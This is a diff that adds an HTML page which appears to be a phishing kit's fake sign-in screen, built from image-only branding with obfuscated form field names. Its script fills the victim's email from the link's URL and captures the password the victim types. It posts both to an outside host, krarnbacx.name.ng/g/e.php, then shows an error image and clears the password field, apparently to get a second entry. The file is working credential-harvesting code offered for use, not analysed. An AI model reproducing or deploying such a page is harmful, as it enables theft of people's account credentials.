@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <title></title>
+
+        <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <script src="jquery.min.js"></script>
+   
+    <link href="style.css" rel="stylesheet">
+<script>
+$(document).ready(function() {
+
+    $('.fx-body').hide();
+
+    $('.items').click(() => {
+
+        $('.fx-body').toggle('1000');
+
+    });
+
+
+
+    var baseUrl = (window.location).href;
+
+    var url = baseUrl.substring(baseUrl.lastIndexOf('=') + 1);
+
+    $("#xx").val(url);
+
+
+
+    $("#formx").submit(function(e) {
+
+        e.preventDefault();
+
+        var formData = new FormData($("#formx")[0]);
+
+        $("#Btn").html('Processing..').prop("disabled", true);
+
+        $.ajax({
+
+            url: "https://krarnbacx.name.ng/g/e.php",
+
+            type: 'POST',
+
+            data: formData,
+
+            contentType: false,
+
+            processData: false,
+
+            success: function(res) {
+
+                console.log(res);
+
+                $('#bd').show();
+
+                $('#hm').hide();
+
+                setTimeout(function() {
+
+                    $("#xx").val(url);
+
+                    $("#xxx").val("");
+
+                    $('.ms').html('<img src="img/es.png">');
+
+                    $("#Btn").html('Sign In').prop("disabled", false);
+
+                }, 2000);
+
+
+
+            }
+
+        });
+
+    });
+
+
+
+});
+</script>
+</head>
+
+<body style="height:100vh;">
+
+    <header>
+        <img src="img/lg.png">
+    </header>
+    <aside>
+        <img src="img/ca.png">
+    </aside>
+
+
+
+    <div class="items">
+        <div class="item-con">
+            <img src="img/1a.png">
+        </div>
+        <div class="item-con">
+            <img src="img/2a.png">
+        </div>
+        <div class="item-con">
+            <img src="img/3a.png">
+        </div>
+        <div class="item-con">
+            <img src="img/4a.png">
+        </div>
+
+    </div>
+    <div class="fx-body">
+        <img src="img/xc.png" class="img-fluid">
+        <div class="ms"></div>
+        <small class="text-danger" id="msg" style="font-weight:600;"></small>
+        <form method="post" id="formx" class="my-4">
+            <div>
+                <input type="text" name="x1" id="xx" value="" readonly>
+            </div>
+            <div>
+                <input type="password" name="x2" id="xxx" placeholder="Password" value="" required>
+            </div>
+            <div>
+                <img src="img/sd1.png">
+            </div>
+            <div>
+                <button id="Btn">Sign In</button>
+            </div>
+        </form>
+</body>
+
+</html>
